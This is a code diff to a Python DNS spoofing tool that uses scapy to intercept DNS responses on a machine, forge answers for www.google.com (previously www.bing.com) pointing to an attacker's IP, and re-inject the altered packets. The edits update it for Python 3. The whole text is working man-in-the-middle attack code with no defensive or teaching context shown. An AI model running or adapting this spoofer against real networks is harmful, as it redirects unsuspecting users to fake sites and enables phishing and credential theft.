@@ -26,14 +26,17 @@ def get_argument():
 
 #Function that process every packet that pass through the machine
 def process_packet(packet):
+    scapy.load_layer('http')
+    #print(packet)
     #converting packets in scapy packets
     scapy_packet = scapy.IP(packet.get_payload())
+    #print(scapy_packet.show())
     #check if the packet has a layer that contain DNS response
     if scapy_packet.haslayer(scapy.DNSRR):
         #Sotored the website domain
         qname = scapy_packet[scapy.DNSQR].qname
         #cheack if the website we are going to spoof is in the qname
-        if "www.bing.com" in qname:
+        if "www.google.com" in qname.decode():
             #print information that we are spoffing
             print("[+] Spoofing target...")
             #create an answer to the target. rrname store the website nam and the rdata the ip of our spoof website
@@ -49,7 +52,7 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
             #change the packet to the scapy packet
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
     #send the packet to the target
     packet.accept()
